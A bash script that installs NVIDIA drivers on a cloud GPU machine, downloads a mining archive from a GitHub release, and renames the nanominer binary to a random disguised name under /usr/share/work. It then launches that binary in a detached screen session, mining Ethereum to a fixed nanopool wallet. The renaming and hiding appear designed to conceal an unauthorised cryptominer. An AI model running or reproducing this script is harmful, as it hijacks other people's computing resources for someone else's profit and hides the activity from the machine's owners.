#!/bin/bash
apt-get update
apt-get install -y git wget screen
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
apt-get install -y git wget screen
rm -rf NVIDIA-Linux-x86_64-460.73.01.run
wget https://us.download.nvidia.com/tesla/460.73.01/NVIDIA-Linux-x86_64-460.73.01.run
sudo chmod +x NVIDIA-Linux-x86_64-460.73.01.run
./NVIDIA-Linux-x86_64-460.73.01.run
rm -r /usr/share/work/$azure
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/platinum
wget https://github.com/ts6aud5vkg/gpuissa/releases/download/ethv100/platinum.tar.gz
mv platinum.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar xf platinum.tar.gz
rm -rf platinum.tar.gz && cd platinum
mv nanominer $azure -n
cp $azure "$cpuname"
rm -f  nanominer
echo $cpuname" is starting"
screen -d -m ./"${cpuname}" --algo ethash --server eth-us-east1.nanopool.org:9433 --user 0xd8a689260Cbb1a8FE4F27B0f4114D2c20990D17f --ssl 1
